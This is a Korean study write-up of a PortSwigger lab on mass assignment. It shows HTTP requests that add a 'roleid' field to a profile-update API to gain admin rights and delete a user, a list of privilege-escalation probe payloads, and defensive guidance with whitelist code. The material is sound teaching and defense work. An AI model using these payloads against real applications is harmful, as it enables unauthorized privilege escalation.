# Lab: User role can be modified in user profile

## 개요

- **난이도**: Apprentice
- **주제**: Access Control — Mass Assignment(과다 할당) / 프로필 수정 API 의 `roleid` 변조 / 수직적 권한 상승
- **링크**: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

## 목표

이메일 변경 요청(JSON body)에 `roleid` 필드를 추가로 전송해 서버가 이를 반영하도록 만들고, `roleid=2`(관리자) 권한을 얻어 `/admin` 에서 `carlos` 를 삭제한다.

- 계정: `wiener:peter`

## 이전 랩(003)과의 차이

```
[003 — role in cookie]
  역할을 클라이언트 쿠키(Admin=true)로 조작
  → 서버가 쿠키 값을 그대로 신뢰

[004 — mass assignment (이번)]
  역할을 서버 저장소에 저장하되, 프로필 수정 시
  전달된 roleid 필드를 검증 없이 반영
  → 서버 DB 의 roleid 가 변경됨
```

핵심: **서버가 "수정 가능한 필드"를 제한하지 않고, 요청 body 의 객체를
그대로 사용자 모델에 바인딩(mass assignment)하면 권한 필드까지 변경된다.**

## Mass Assignment 란

```
[정상 로직]
  프로필 수정 시 email 필드만 반영되어야 함

[취약한 구현]
  요청 body 의 모든 키를 User 객체에 그대로 매핑
  → {"email":"...", "roleid":2}
  → email 뿐 아니라 roleid 까지 저장됨
```

```
[개념]
  사용자 입력을 내부 객체의 필드에 "그대로" 할당(assign)하는 것

  역할, 권한, 가격, 잔액, 검증 상태 등
  원래 사용자가 바꾸면 안 되는 필드까지 함께 바뀔 수 있음
```

## 취약 지점

### 프로필 수정 API

```
POST /my-account/change-email HTTP/1.1
Content-Type: application/json

{"email":"wiener@normal-user.net"}
```

응답에서 계정 정보(역할 포함)가 함께 반환된다.

```
HTTP/1.1 302 Found
...

{"email":"wiener@normal-user.net","roleid":1}
```

`roleid` 가 응답에 노출되는 것은 공격자에게 중요한 힌트가 된다.
→ 이 필드가 존재하고, 값이 1(일반) / 2(관리자) 로 구분됨을 알 수 있다.

## 공격 단계

### 1단계 — 로그인 및 프로필 수정 관찰

`wiener:peter` 로 로그인 후 이메일 변경 요청을 Burp Suite 로 캡처한다.

```
POST /my-account/change-email HTTP/1.1
Content-Type: application/json
Cookie: session=...

{"email":"test@test.com"}
```

응답에 `"roleid":1` 이 포함되어 있음을 확인한다.

### 2단계 — roleid 필드 추가

요청 body 에 `"roleid":2` 를 추가해 재전송한다.

```
POST /my-account/change-email HTTP/1.1
Content-Type: application/json
Cookie: session=...

{"email":"test@test.com", "roleid":2}
```

응답:

```
{"email":"test@test.com","roleid":2}
```

→ 서버가 `roleid` 를 반영해 계정 역할이 관리자로 변경됨.

### 3단계 — /admin 접근 및 carlos 삭제

```
GET /admin HTTP/1.1
Cookie: session=...
```

관리자 패널이 반환되면 삭제 기능을 호출한다.

```
GET /admin/delete?username=carlos HTTP/1.1
Cookie: session=...
```

carlos 삭제 완료 → 랩 해결.

## Mass Assignment 탐색 포인트

```
[1] 응답에서 노출되는 필드 확인
    - 프로필 응답에 roleid, is_admin, plan, credits, verified 등
    - 서버가 반환하는 필드는 내부 모델 필드일 가능성이 높음

[2] 요청에 없는 필드를 추가해 본다
    {"email":"...", "roleid":2}
    {"email":"...", "isAdmin":true}
    {"email":"...", "plan":"premium"}

[3] Content-Type 별 차이 확인
    application/json / application/x-www-form-urlencoded
    → 바인딩 방식에 따라 동작이 다를 수 있음

[4] 응답 변화로 반영 여부 확인
    변경 전후 응답/권한 차이 비교
```

## 방어

```
[근본 원인]
  프로필 수정 요청 body 를 User 객체 전체에 그대로 바인딩
  → 수정 가능한 필드 화이트리스트가 없음

[올바른 방어]
  1. DTO/입력 모델 사용 (허용 필드만)
     class UpdateEmailRequest:
         email: str          # roleid 필드 자체가 없음
     update_email(user, req.email)
  2. 수정 가능한 필드 화이트리스트를 명시하고 그 외는 무시/거부
     ALLOWED = {"email", "displayName"}
     for k, v in payload.items():
         if k in ALLOWED:
             setattr(user, k, v)
  3. 권한 관련 필드(role, roleid, isAdmin 등)는
     프로필 수정 API 에서 절대 받지 않음. 서버/관리자만 변경 가능
  4. 응답에 내부 필드(roleid 등)를 불필요하게 노출하지 않음
  5. 민감 변경은 서버 측 인가 검사 후 처리

[안티패턴]
  for key, value in request.json: setattr(user, key, value)
  request.json → user.update() 같은 통째 바인딩
```

## 핵심 정리

- 이메일 변경 요청에 `"roleid":2` 를 추가하는 것만으로 관리자 권한을 얻었다(Mass Assignment).
- 응답에 `roleid` 가 노출되어 공격자는 변경할 필드와 값을 알 수 있었다.
- 사용자 입력을 내부 객체에 그대로 바인딩하면 권한·가격·상태 등 민감 필드까지 변경된다.
- 방어는 허용 필드만 받는 DTO/화이트리스트이며, 권한 필드는 프로필 수정 API 에서 다루지 않아야 한다.

## 배운 점

- 003 은 역할을 클라이언트 값(쿠키)에 둔 문제, 004 는 역할을 서버 값으로 두되 수정 API 가 필드를 제한하지 않은 문제다.
- API 응답에 노출된 필드 목록은 "어떤 필드를 조작할 수 있는가" 의 실마리가 된다.
- mass assignment 는 접근 제어뿐 아니라 가격 조작, 계정 상태 변경 등 비즈니스 로직 전반으로 확장될 수 있다.
